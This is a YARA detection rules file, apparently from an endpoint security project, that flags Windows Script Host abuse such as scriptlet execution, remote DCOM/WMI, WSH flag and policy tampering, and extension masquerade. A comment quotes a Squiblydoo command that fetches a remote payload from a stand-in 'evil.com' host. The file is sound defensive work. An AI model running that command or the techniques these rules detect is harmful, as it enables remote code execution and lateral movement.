// Windows Script Host infrastructure-level abuse fingerprints. Covers COM
// scriptlet (.sct/.wsc) execution, script: moniker loading, WshController
// remote execution, WSH flag abuse, remote DCOM/WMI instantiation, WSH
// policy tampering, and signed script proxy execution gaps.
//
// Tier: signal-only — WSH infrastructure is used legitimately by admins.
// Chain with: non-interactive parent, temp/Downloads path, remote URL in
// moniker, unsigned/renamed binary, or policy change + script execution.
//
// Note: language-level JScript/VBScript patterns are in
// javascript_malware_patterns.yar and vbscript_malware_patterns.yar.

// ---------------------------------------------------------------------------
// COM scriptlet execution (.sct / .wsc). Scriptlets are XML-based COM
// objects that can contain JScript or VBScript. The runtime is scrobj.dll.
// Squiblydoo attack: regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll
// Also loadable via GetObject("script:url") moniker.
// ---------------------------------------------------------------------------
rule WSH_COM_Scriptlet_Execution
{
    meta:
        description = "COM scriptlet (.sct/.wsc) execution: scrobj.dll / regsvr32 Squiblydoo / script: moniker (T1218.010)"
        author      = "NortonEDR"
        tier        = "signal-only"
        severity    = "critical"
        scan_target = "file,process_memory"

    strings:
        // regsvr32 Squiblydoo patterns
        $sq1 = "regsvr32 /i:"                                         ascii nocase
        $sq2 = "regsvr32.exe /i:"                                     ascii nocase
        $sq3 = "regsvr32 /s /n /u /i:"                                ascii nocase
        $sq4 = "regsvr32.exe /s /n /u /i:"                            ascii nocase

        // scrobj.dll reference
        $scr1 = "scrobj.dll"                                           ascii nocase

        // script: moniker — load scriptlet from URL or file path
        $mon1 = "GetObject(\"script:"                                  ascii nocase
        $mon2 = "GetObject(\"script:http"                              ascii nocase
        $mon3 = "GetObject(\"script:file"                              ascii nocase
        $mon4 = "GetObject(\"script:\\\\"                              ascii nocase

        // Wide forms
        $sq1w = "regsvr32 /i:"                                        wide nocase
        $mon1w = "GetObject(\"script:"                                 wide nocase

    condition:
        any of ($sq*) and $scr1
        or any of ($mon*)
        or ($sq1w and $scr1)
}


// ---------------------------------------------------------------------------
// COM scriptlet file structure. Detects .sct/.wsc file content: XML with
// <scriptlet>, <registration>, and embedded <script> blocks. The
// <registration> element registers a COM class that runs attacker code
// when instantiated.
// ---------------------------------------------------------------------------
rule WSH_Scriptlet_File_Content
{
    meta:
        description = "COM scriptlet file content: <scriptlet> + <registration> + <script> — malicious COM component (T1218.010)"
        author      = "NortonEDR"
        tier        = "signal-only"
        severity    = "high"
        scan_target = "file"

    strings:
        $tag1 = "<scriptlet>"                                          ascii nocase
        $tag2 = "</scriptlet>"                                         ascii nocase
        $tag3 = "<registration"                                        ascii nocase
        $tag4 = "<script language="                                    ascii nocase
        $tag5 = "<public>"                                             ascii nocase
        $tag6 = "progid="                                              ascii nocase

        // Dangerous content inside scriptlet
        $d1 = "WScript.Shell"                                          ascii nocase
        $d2 = "ActiveXObject"                                          ascii nocase
        $d3 = "Shell.Application"                                      ascii nocase
        $d4 = "ADODB.Stream"                                           ascii nocase
        $d5 = "Scripting.FileSystemObject"                             ascii nocase
        $d6 = "cmd.exe"                                                ascii nocase
        $d7 = "powershell"                                             ascii nocase

    condition:
        ($tag1 and $tag3 and $tag4)
        or ($tag1 and $tag4 and any of ($d*))
        or ($tag3 and $tag6 and $tag4)
}


// ---------------------------------------------------------------------------
// WshController / WshRemote — WSH remote script execution. WshController
// creates WshRemote objects that execute scripts on remote machines via
// DCOM. Less common than WinRM/PsExec but harder to detect at the
// network layer.
// ---------------------------------------------------------------------------
rule WSH_Remote_Script_Execution
{
    meta:
        description = "WshController/WshRemote: WSH remote script execution via DCOM (T1021.006)"
        author      = "NortonEDR"
        tier        = "signal-only"
        severity    = "critical"
        scan_target = "file,process_memory"

    strings:
        $wr1 = "WshController"                                        ascii nocase
        $wr2 = "WshRemote"                                            ascii nocase
        $wr3 = "CreateScript("                                        ascii nocase
        $wr4 = ".Execute"                                              ascii nocase

        // WScript.CreateObject with event sink (2nd parameter)
        $ev1 = "WScript.CreateObject("                                 ascii nocase
        $ev2 = "WScript.ConnectObject"                                 ascii nocase
        $ev3 = "WScript.DisconnectObject"                              ascii nocase

        $wr1w = "WshController"                                       wide nocase
        $wr2w = "WshRemote"                                           wide nocase

    condition:
        ($wr1 or $wr1w) and ($wr3 or $wr4)
        or ($wr2 or $wr2w)
        or ($ev1 and $wr1)
        or $ev2 or $ev3
}


// ---------------------------------------------------------------------------
// WSH command-line flag abuse. Attackers use WSH flags to change default
// script host, enable debugger attachment, select specific jobs from WSF
// files, or save modified settings as default — all for evasion or
// persistence purposes.
// ---------------------------------------------------------------------------
rule WSH_Flag_Abuse
{
    meta:
        description = "WSH command-line flag abuse: //H (host change), //D (debugger), //Job (WSF job select), //S (save settings) (T1059)"
        author      = "NortonEDR"
        tier        = "signal-only"
        severity    = "high"
        scan_target = "file,process_memory"

    strings:
        // Host change — sets default script host
        $h1 = "//H:CScript"                                           ascii nocase
        $h2 = "//H:WScript"                                           ascii nocase

        // Debugger attachment
        $d1 = "//D "                                                   ascii nocase
        $d2 = "//D\""                                                  ascii nocase

        // Job selection from WSF
        $j1 = "//Job:"                                                 ascii nocase

        // Save current settings as default
        $s1 = "//S"                                                    ascii nocase

        // Engine override to run arbitrary extensions as script
        $e1 = "//E:JScript"                                           ascii nocase
        $e2 = "//E:VBScript"                                          ascii nocase
        $e3 = "//E:JScript.Encode"                                    ascii nocase
        $e4 = "//E:VBScript.Encode"                                   ascii nocase

        // Batch mode (suppress UI) — evasion
        $b1 = "//B "                                                   ascii nocase
        $b2 = "//B\""                                                  ascii nocase

        // Paired with suspicious file paths
        $fp1 = "%TEMP%"                                                ascii nocase
        $fp2 = "%APPDATA%"                                             ascii nocase
        $fp3 = "\\Downloads\\"                                        ascii nocase

    condition:
        any of ($h*)
        or ($d1 or $d2) and any of ($e*)
        or $j1
        or (any of ($e3, $e4))
        or (($b1 or $b2) and any of ($e*) and any of ($fp*))
}


// ---------------------------------------------------------------------------
// Remote DCOM object instantiation. GetObject("new:{CLSID}") or
// CreateObject("ProgID", "remote_server") to instantiate COM objects on
// remote hosts — used for lateral movement without PsExec/WinRM.
// ---------------------------------------------------------------------------
rule WSH_Remote_DCOM_Instantiation
{
    meta:
        description = "Remote DCOM instantiation: GetObject(new:{CLSID}) / CreateObject with server parameter — lateral movement (T1021.003)"
        author      = "NortonEDR"
        tier        = "signal-only"
        severity    = "critical"
        scan_target = "file,process_memory"

    strings:
        // GetObject("new:{CLSID}") — DCOM by CLSID
        $dcom1 = "GetObject(\"new:"                                    ascii nocase
        $dcom2 = "GetObject(\"new:{"                                   ascii nocase

        // CreateObject with 2nd parameter (remote server)
        $dcom3 = "CreateObject("                                       ascii nocase

        // Remote WMI namespace connections
        $rwmi1 = "winmgmts:\\\\"                                      ascii nocase
        $rwmi2 = "\\\\root\\cimv2"                                    ascii nocase
        $rwmi3 = "GetObject(\"winmgmts:\\\\"                          ascii nocase

        // Known DCOM lateral movement CLSIDs
        $clsid1 = "9BA05972-F6A8-11CF-A442-00A0C90A8F39"              ascii nocase
        $clsid2 = "C08AFD90-F2A1-11D1-8455-00A0C91F3880"              ascii nocase
        $clsid3 = "49B2791A-B1AE-4C90-9B8E-E860BA07F889"              ascii nocase

        // Remote host indicators
        $rh1 = "\\\\"                                                  ascii
        $rh2 = ".ExecuteShellCommand("                                 ascii nocase
        $rh3 = ".Document.Application"                                 ascii nocase

    condition:
        any of ($dcom1, $dcom2)
        or $rwmi3
        or ($rwmi1 and $rwmi2)
        or any of ($clsid*)
        or ($dcom3 and any of ($rh*) and any of ($clsid*))
}


// ---------------------------------------------------------------------------
// WSH policy tampering. Modifying Windows Script Host settings via
// registry to re-enable disabled WSH, change trust policy, or bypass
// Group Policy restrictions on script execution.
// ---------------------------------------------------------------------------
rule WSH_Policy_Tampering
{
    meta:
        description = "WSH policy tampering: registry modification of Windows Script Host Settings (T1562)"
        author      = "NortonEDR"
        tier        = "signal-only"
        severity    = "critical"
        scan_target = "file,process_memory"

    strings:
        // WSH settings registry path
        $rp1 = "\\Windows Script Host\\Settings"                       ascii nocase
        $rp2 = "Software\\Microsoft\\Windows Script Host"              ascii nocase

        // Policy values
        $pv1 = "Enabled"                                               ascii nocase
        $pv2 = "TrustPolicy"                                          ascii nocase
        $pv3 = "IgnoreUserSettings"                                    ascii nocase
        $pv4 = "UseWINSAFER"                                          ascii nocase

        // Registry modification methods
        $rm1 = "RegWrite("                                             ascii nocase
        $rm2 = "Set-ItemProperty"                                      ascii nocase
        $rm3 = "New-ItemProperty"                                      ascii nocase
        $rm4 = "reg add"                                               ascii nocase
        $rm5 = "REG ADD"                                               ascii

        // WScript.Timeout (in-script timeout disable)
        $to1 = "WScript.Timeout"                                       ascii nocase
        $to2 = ".Timeout = 0"                                         ascii nocase

    condition:
        (any of ($rp*) and any of ($pv*))
        or (any of ($rp*) and any of ($rm*))
        or $to2
}


// ---------------------------------------------------------------------------
// WSH network operations. WScript.Network COM object for drive mapping,
// printer connections, and network enumeration — used for lateral movement
// and resource access from scripts.
// ---------------------------------------------------------------------------
rule WSH_Network_Operations
{
    meta:
        description = "WScript.Network: drive mapping, printer connect, network enumeration from WSH (T1021.002 + T1016)"
        author      = "NortonEDR"
        tier        = "signal-only"
        severity    = "high"
        scan_target = "file,process_memory"

    strings:
        $net1 = "WScript.Network"                                      ascii nocase
        $net2 = "WNetwork"                                             ascii nocase

        // Network drive operations
        $drv1 = ".MapNetworkDrive("                                    ascii nocase
        $drv2 = ".RemoveNetworkDrive("                                 ascii nocase
        $drv3 = ".EnumNetworkDrives"                                   ascii nocase

        // Printer operations
        $prn1 = ".AddWindowsPrinterConnection("                        ascii nocase
        $prn2 = ".EnumPrinterConnections"                              ascii nocase

        // Network info enumeration
        $inf1 = ".ComputerName"                                        ascii nocase
        $inf2 = ".UserDomain"                                          ascii nocase
        $inf3 = ".UserName"                                            ascii nocase

        // UNC paths (lateral movement targets)
        $unc1 = "\\\\"                                                 ascii

    condition:
        ($net1 or $net2) and any of ($drv*)
        or ($net1 or $net2) and ($prn1 or $prn2)
        or ($net1 and $unc1 and any of ($drv*))
}


// ---------------------------------------------------------------------------
// WSH engine override for extension masquerade. Using //E: flag to run a
// file with an innocent extension (.txt, .doc, .log, .jpg, .tmp) as
// JScript or VBScript — bypasses file extension-based detection.
// ---------------------------------------------------------------------------
rule WSH_Extension_Masquerade
{
    meta:
        description = "WSH //E: engine override on non-script extension — extension masquerade to bypass file-type detection (T1036.008)"
        author      = "NortonEDR"
        tier        = "signal-only"
        severity    = "critical"
        scan_target = "file,process_memory"

    strings:
        // Engine override flags
        $eo1 = "//E:JScript"                                          ascii nocase
        $eo2 = "//E:VBScript"                                         ascii nocase
        $eo3 = "//E:JScript.Encode"                                   ascii nocase
        $eo4 = "//E:VBScript.Encode"                                  ascii nocase

        // Non-script file extensions that could be masquerading
        $ext1 = ".txt"                                                 ascii nocase
        $ext2 = ".log"                                                 ascii nocase
        $ext3 = ".tmp"                                                 ascii nocase
        $ext4 = ".dat"                                                 ascii nocase
        $ext5 = ".doc"                                                 ascii nocase
        $ext6 = ".jpg"                                                 ascii nocase
        $ext7 = ".png"                                                 ascii nocase
        $ext8 = ".pdf"                                                 ascii nocase
        $ext9 = ".csv"                                                 ascii nocase
        $ext10 = ".ini"                                                ascii nocase

        // WSH hosts
        $host1 = "wscript"                                            ascii nocase
        $host2 = "cscript"                                            ascii nocase

    condition:
        any of ($eo*) and any of ($ext*) and any of ($host*)
}
